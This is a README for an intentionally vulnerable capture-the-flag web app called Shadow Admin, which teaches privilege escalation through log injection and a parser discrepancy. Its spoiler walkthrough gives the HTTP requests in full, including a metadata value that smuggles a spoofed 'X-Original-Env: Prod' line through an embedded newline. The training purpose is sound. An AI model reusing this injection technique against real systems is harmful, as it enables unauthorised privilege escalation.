# 🕶️ Shadow Admin

> **A CTF challenge built around Authorization Drift via Parser Discrepancy**

Shadow Admin is a realistic, self-contained web exploitation challenge. Players take on the role of a low-privileged `dev` user and must escalate access to read a production server's backup — protected by an ABAC engine — without ever modifying the authorization logic itself.

---

## 🧠 Challenge Concept

The vulnerability is **Authorization Drift via Parser Discrepancy** — a class of real-world bugs where two components of a system parse the same data differently, and an attacker exploits the gap between them.

In Shadow Admin:

- The **Janitor Bot** builds quarantine logs by serialising server metadata into a line-based format, appending system keys like `X-Original-Env` at the end.
- The **Restore Engine** reads those logs, trusting the **first** occurrence of `X-Original-Env` as the authoritative environment value.
- The **metadata write endpoint** blocks keys starting with `X-` — but it doesn't prevent values that *look like* log lines.

The exploit chain requires the player to:

1. Create a `Dev` server they own.
2. Write a metadata value that contains an embedded newline followed by a spoofed `X-Original-Env: Prod` line.
3. Orphan the server, triggering the Janitor Bot to quarantine it and bake the spoofed line into the log.
4. Restore the server — the Restore Engine reads the injected line first and promotes the server to `Prod`.
5. Access the `/prod/internal/backup` endpoint, which now passes the ABAC check for the `Prod` + owned-by-player combination.

---

## 🏗️ Architecture

```
shadow-admin/
├── app/
│   ├── main.py              # FastAPI app, startup, routing
│   ├── auth.py              # Fake auth — always returns the 'player' dev user
│   ├── abac.py              # ABAC engine — pure logic, no DB, not exploited directly
│   ├── db.py                # SQLAlchemy engine + session
│   ├── models.py            # ORM models: User, Server, ServerMetadata, QuarantineLog
│   ├── routes/
│   │   ├── servers.py       # Server lifecycle API (create, orphan, metadata, restore)
│   │   └── internal.py      # /prod/internal/backup — flag endpoint
│   ├── templates/           # Jinja2 HTML templates (index, server, quarantine)
│   └── static/              # CSS + JS frontend
│
├── bot/
│   └── janitor.py           # Background bot: orphaned → quarantined, builds log
│
├── restore/
│   └── restore.py           # Restore engine: parses quarantine log, updates server state
│
├── migrations/
│   └── init.sql             # DB schema + seed data (player, janitor-bot, decoy Prod servers)
│
├── dockerfile
├── docker-compose.yml
└── requirements.txt
```

---

## 🔐 ABAC Policy

The authorization engine (`app/abac.py`) enforces the following policy and is **not modified** by the exploit:

| Environment | Condition for Access |
|-------------|----------------------|
| `Dev`       | `server.owner_id == user.id` |
| `Prod`      | `user.role == "admin"` **OR** `server.owner_id == user.id` |

Players start as `role: dev`. The key insight is that the ABAC engine itself is correct — the vulnerability lives in the data pipeline feeding it.

---

## 🚩 The Flag

```
FLAG{shadow_admin_prod_backup_access}
```

Retrieved from `GET /prod/internal/backup?server_id=<server_id>` once the ABAC check passes.

---

## 🎮 Exploit Walkthrough

> **Spoiler** — skip this section if you want to solve it yourself.

<details>
<summary>Click to reveal the full exploit chain</summary>

### Step 1 — Create a Dev server

```http
POST /servers?name=myserver
```

Note the returned `server_id`.

### Step 2 — Inject a spoofed log line via metadata

```http
POST /servers/{server_id}/metadata
Content-Type: application/json

{
  "key": "info",
  "value": "normal-value\nX-Original-Env: Prod"
}
```

The `update_metadata` endpoint blocks keys starting with `X-`, but has no restrictions on **values** containing newlines or `X-` content.

### Step 3 — Orphan the server

```http
POST /servers/{server_id}/orphan
```

This sets `owner_id = NULL` and `status = orphaned`.

### Step 4 — Wait for the Janitor Bot

The bot runs every 20 seconds. It picks up orphaned servers, serialises all metadata into a log file, then appends:

```
X-Original-Env: Dev
system_status: quarantined
```

Because the injected value contains a newline, the log now reads:

```
info: normal-value
X-Original-Env: Prod      ← injected — appears FIRST
X-Original-Env: Dev       ← real — appended by bot
system_status: quarantined
```

### Step 5 — Restore the server

```http
POST /servers/{server_id}/restore
```

The Restore Engine reads line-by-line and takes the **first** `X-Original-Env` match. It sets `server.environment = "Prod"` and `server.owner_id = player_id`.

### Step 6 — Access the flag

```http
GET /prod/internal/backup?server_id={server_id}
```

The ABAC check now evaluates: environment is `Prod`, `owner_id == player.id` → **access granted**.

```json
{ "backup": "FLAG{shadow_admin_prod_backup_access}" }
```

</details>

---

## 🛠️ Running Locally

### Prerequisites

- Docker
- Docker Compose

### Start the challenge

```bash
git clone https://github.com/your-username/shadow-admin.git
cd shadow-admin
docker compose up --build
```

The application will be available at **http://localhost:8000**.

The database is seeded automatically on first boot via `migrations/init.sql`.

### Stopping

```bash
docker compose down -v   # -v removes the postgres volume for a clean reset
```

---

## 🧩 Components Summary

| Component | Role | Notes |
|-----------|------|-------|
| `app/abac.py` | Authorization engine | Pure logic — correct by design, not exploited |
| `app/auth.py` | Authentication stub | Always returns the `player` dev user — intentional for CTF |
| `bot/janitor.py` | Background bot | Serialises metadata into quarantine logs every 20s |
| `restore/restore.py` | Restore engine | Line-based parser — vulnerable to first-match injection |
| `app/routes/servers.py` | Server API | ABAC-gated operations + metadata write endpoint |
| `app/routes/internal.py` | Flag endpoint | `GET /prod/internal/backup` — returns flag on valid ABAC pass |

---

## 🧱 Tech Stack

| Layer | Technology |
|-------|-----------|
| Backend | Python 3.11 / FastAPI |
| ORM | SQLAlchemy |
| Database | PostgreSQL 15 |
| Templates | Jinja2 |
| Server | Uvicorn |
| Container | Docker + Docker Compose |

---

## 🎯 Learning Objectives

After solving this challenge, players will understand:

- **Authorization Drift** — when two system components disagree on the meaning of the same data.
- **Parser Discrepancy Attacks** — exploiting the gap between how data is written versus how it is read.
- **Log Injection** — embedding control characters or structured content into user-supplied values that flow into log-like formats.
- **ABAC Policy Bypass** — achieving privilege escalation without touching the policy engine itself.
- **Trusting the Pipeline, Not Just the Gate** — how a correct authorization check can still be defeated upstream.

---

## ⚠️ Disclaimer

This project is designed exclusively for educational and CTF purposes. All vulnerabilities are intentional. Do not deploy this application in a production environment.

---

## 📄 License

MIT
